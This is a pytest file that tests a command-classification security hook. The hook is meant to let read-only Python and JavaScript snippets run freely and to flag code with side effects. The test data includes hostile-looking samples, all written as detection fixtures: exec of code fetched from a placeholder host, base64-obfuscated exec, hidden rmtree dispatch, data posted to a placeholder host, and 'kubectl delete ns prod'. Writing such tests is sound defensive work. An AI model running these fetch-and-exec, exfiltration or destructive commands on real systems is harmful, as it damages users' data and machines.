"""A generated batch of read-only and mutating or obfuscated code, driven through the inline and script-file lanes."""

from __future__ import annotations

import shlex
import sys
from pathlib import Path

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[4]
for entry in (str(_REPO_ROOT), str(_REPO_ROOT / "hooks")):
    if entry not in sys.path:
        sys.path.insert(0, entry)

from modules.security.blocked_commands import is_blocked_command  # noqa: E402
from modules.security.mutative_verbs import MAX_NORMAL_INLINE_LENGTH, detect_mutative_command  # noqa: E402

PY_READ_BODY = [
    "import json, pathlib",
    "data = json.loads(pathlib.Path('package.json').read_text())",
    "rows = sorted(data.items())",
    "for key, value in rows:",
    "    print(key, json.dumps(value, sort_keys=True)[:60])",
    "print('keys', len(rows))",
]
PY_READ_TAILS = [
    "import subprocess",
    "print(subprocess.run(['git', 'status', '--short'], capture_output=True, text=True).stdout)",
    "import sys",
    "sys.stdout.write(str(len(rows)))",
    "import sqlite3",
    "print(sqlite3.connect('x.db').execute('select count(*) from t').fetchall())",
    "print(eval('1 + 1'))",
]
PY_EFFECT_TAILS = {
    "rmtree": "import shutil\nshutil.rmtree('build')",
    "open-write": "open('out.txt', 'w').write('x')",
    "path-write": "pathlib.Path('out.txt').write_text('x')",
    "bound-write": "fh = open('out.txt', mode)\nfh.write('x')",
    "subprocess-mutating": "import subprocess\nsubprocess.run(['kubectl', 'apply', '-f', 'x.yaml'])",
    "subprocess-shell": "import subprocess\nsubprocess.run('git status', shell=True)",
    "subprocess-dynamic-argv": "import subprocess\nsubprocess.run(argv)",
    "subprocess-stdin-shell": "import subprocess\nsubprocess.run(['bash', '-s'])",
    "os-system": "import os\nos.system('ls')",
    "exec-dynamic": "exec(input())",
    "eval-fetched": "import urllib.request as u\nexec(u.urlopen('https://example.invalid/x').read())",
    "exec-literal-mutation": "exec('import shutil; shutil.rmtree(pathlib.Path().name)')",
    "import-dynamic": "import importlib\nimportlib.import_module(name)",
    "dunder-import-dynamic": "__import__(name).rmtree('build')",
    "getattr-dispatch": "import shutil\ngetattr(shutil, 'rm' + 'tree')('build')",
    "socket": "import socket\nsocket.create_connection(('example.invalid', 80))",
    "requests": "import requests\nrequests.post('https://example.invalid', data='x')",
    "sql-write": "import sqlite3\nsqlite3.connect('x.db').execute('delete from t')",
    "sql-commit": "import sqlite3\nc = sqlite3.connect('x.db')\nc.commit()",
    "base64-exec": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))",
    "tempfile": "import tempfile\ntempfile.mkstemp()",
    "chmod": "import os\nos.chmod('x', 0o777)",
}
JS_READ = (
    "const fs=require('fs');const p=JSON.parse(fs.readFileSync('prd.json','utf8'));"
    + "console.log('items', (p.items||[]).length);" * 14
)
JS_EFFECT_TAILS = {
    "rename": "fs.renameSync('a','b');",
    "eval": "eval(process.argv[1]);",
    "new-function": "new Function(p.code)();",
    "dynamic-require": "require(p.mod);",
    "net": "require('net').connect(80,'example.invalid');",
    "child-process": "require('child_process').execSync('kubectl apply -f x');",
    "write": "fs.writeFileSync('x','y');",
    "rm": "fs.rmSync('x',{recursive:true});",
    "mkdir": "fs.mkdirSync('x');",
}


def _python(lines: list) -> str:
    code = "\n".join(lines)
    while len(code) <= MAX_NORMAL_INLINE_LENGTH:
        code += "\nprint('padding to exceed the length heuristic')"
    return code


def _judge(command: str, cwd: str | None = None) -> str:
    if is_blocked_command(command).is_blocked:
        return "BLOCKED"
    return "ASK" if detect_mutative_command(command, cwd=cwd).is_mutative else "FREE"


def _spellings(code: str, tmp_path: Path, name: str) -> dict:
    script = tmp_path / f"{name}.py"
    script.write_text(code, encoding="utf-8")
    assert '"' not in code and "$" not in code
    spellings = {
        "python -c": f'python3 -c "{code}"',
        "heredoc": f"python3 - <<'PY'\n{code}\nPY",
        "script": f"python3 {script.name}",
    }
    return spellings


@pytest.mark.parametrize("tail", [[]] + [[line] for line in PY_READ_TAILS if not line.startswith("import")]
                         + [[PY_READ_TAILS[0], PY_READ_TAILS[1]], [PY_READ_TAILS[2], PY_READ_TAILS[3]],
                            [PY_READ_TAILS[4], PY_READ_TAILS[5]]], ids=lambda t: "+".join(x[:12] for x in t) or "plain")
def test_long_python_that_only_reads_is_free_in_every_spelling(tail, tmp_path):
    code = _python(PY_READ_BODY + tail)
    for spelling, command in _spellings(code, tmp_path, "read").items():
        assert _judge(command, str(tmp_path)) == "FREE", (spelling, code)


@pytest.mark.parametrize("name", list(PY_EFFECT_TAILS))
def test_long_python_with_an_effect_asks_in_every_spelling(name, tmp_path):
    code = _python(PY_READ_BODY + PY_EFFECT_TAILS[name].split("\n"))
    for spelling, command in _spellings(code, tmp_path, name).items():
        assert _judge(command, str(tmp_path)) != "FREE", (spelling, name)


@pytest.mark.parametrize("name", list(PY_EFFECT_TAILS))
def test_short_python_with_an_effect_asks_in_every_spelling(name, tmp_path):
    code = PY_EFFECT_TAILS[name]
    (tmp_path / "short.py").write_text(code + "\n", encoding="utf-8")
    for command in (f"python3 -c {shlex.quote(code.replace(chr(10), '; '))}",
                    f"python3 - <<'PY'\n{code}\nPY", "python3 short.py"):
        assert _judge(command, str(tmp_path)) != "FREE", (name, command)


def test_long_javascript_that_only_reads_is_free():
    assert len(JS_READ) > MAX_NORMAL_INLINE_LENGTH
    assert _judge(f"node -e {shlex.quote(JS_READ)}") == "FREE"


@pytest.mark.parametrize("name", list(JS_EFFECT_TAILS))
def test_long_javascript_with_an_effect_asks(name):
    assert _judge(f"node -e {shlex.quote(JS_READ + JS_EFFECT_TAILS[name])}") != "FREE", name


def test_a_template_literal_is_no_command_but_a_ruby_backtick_is():
    assert _judge("node -e 'console.log(`${a} and ${b}`)'") == "FREE"
    assert _judge("ruby -e 'puts `kubectl delete ns prod`'") != "FREE"


def test_a_script_is_read_where_the_shell_finds_it(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    (tmp_path / "read.py").write_text("print(open('package.json').read())\n", encoding="utf-8")
    (tmp_path / "deploy.py").write_text("import shutil\nshutil.rmtree('build')\n", encoding="utf-8")
    assert _judge("python3 ~/read.py") == "FREE"
    assert _judge("python3 ~/deploy.py") == "ASK"
    assert detect_mutative_command("python3 ~/missing.py").verb == "script-file-unreadable"
